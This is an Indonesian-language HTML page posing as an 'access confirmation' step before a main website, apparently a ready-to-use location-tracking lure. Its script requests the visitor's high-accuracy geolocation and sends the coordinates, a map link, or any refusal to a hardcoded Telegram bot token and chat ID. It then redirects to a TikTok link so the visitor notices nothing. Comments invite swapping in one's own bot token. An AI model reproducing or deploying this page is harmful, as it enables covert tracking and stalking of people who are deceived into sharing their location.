<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menuju Website Utama...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        h2 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.6rem;
        }
        p {
            color: #7f8c8d;
            font-size: 1rem;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background-color: #3498db;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            transition: background 0.2s ease;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .loading {
            display: none;
            margin-top: 15px;
            color: #e67e22;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Konfirmasi Akses</h2>
        <p>Untuk melanjutkan ke website utama kami, silakan klik tombol di bawah dan izinkan akses lokasi jika diminta oleh browser Anda.</p>
        
        <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
        <div class="loading" id="statusTeks">Menghubungkan ke server...</div>
    </div>

    <script>
        // === KONFIGURASI UTAMA ===
        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; // Ganti dengan Token Bot Anda
        const CHAT_ID = '1966317946'; // Ganti dengan ID Chat Telegram Anda
        const DOMAIN_TUJUAN = 'https://vm.tiktok.com/ZS9YxEJSWNjov-IjqN4/'; // Ganti dengan domain tujuan Anda

        function prosesMasuk() {
            const btn = document.getElementById('btnLanjut');
            const status = document.getElementById('statusTeks');
            
            btn.disabled = true;
            btn.innerText = "Memproses...";
            status.style.display = "block";

            // Cek apakah browser mendukung fitur Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // Jika pengguna mengizinkan
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const pesan = `📍 *Akses Lokasi Diterima*\n\n• Lat: \`${lat}\`\n• Lon: \`${lon}\`\n• Akurasi: ±${Math.round(akurasi)} meter\n• Peta: https://google.com{lat},${lon}`;
                        
                        kirimKeTelegram(pesan);
                    },
                    // Jika pengguna menolak / terjadi kesalahan
                    function(error) {
                        let alasan = "Ditolak pengguna / Tidak diketahui";
                        if (error.code === error.PERMISSION_DENIED) {
                            alasan = "Pengguna menolak izin lokasi";
                        }
                        const pesan = `⚠️ *Akses Lokasi Ditolak*\n\n• Detail: ${alasan}\n• Status: Pengguna tetap dialihkan ke website.`;
                        
                        kirimKeTelegram(pesan);
                    },
                    // Pengaturan tambahan (Timeout 10 detik)
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                // Jika browser jadul tidak mendukung
                kirimKeTelegram("❌ *Error*: Browser tidak mendukung fitur Geolokasi.");
            }
        }

        function kirimKeTelegram(teksPesan) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: teksPesan,
                    parse_mode: 'Markdown'
                })
            })
            .then(() => {
                // Setelah data terkirim ke Telegram, alihkan ke website utama
                window.location.href = DOMAIN_TUJUAN;
            })
            .catch((err) => {
                console.error("Gagal mengirim log:", err);
                // Tetap alihkan pengguna meskipun bot gagal menerima pesan
                window.location.href = DOMAIN_TUJUAN;
            });
        }
    </script>

</body>
</html>
